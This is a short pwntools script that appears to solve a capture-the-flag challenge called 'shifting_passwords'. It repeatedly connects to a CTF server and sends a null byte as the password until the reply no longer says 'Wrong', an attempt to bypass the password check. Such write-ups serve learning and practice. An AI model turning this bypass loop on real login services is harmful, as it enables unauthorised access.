from pwn import *

context.binary = elf = ELF('shifting_passwords')
context.log_level = 'debug'

for i in range(1000):
    io = remote('chals.cyberthon22f.ctf.sg', 10201)
    io.recvuntil(b'Welcome APOCALYPSE! Enter the password here: ')
    payload = b'\x00'
    io.sendline(payload)
    r = io.recvall()
    if (not b'Wrong' in r):
        print(r)
        break
    io.close()
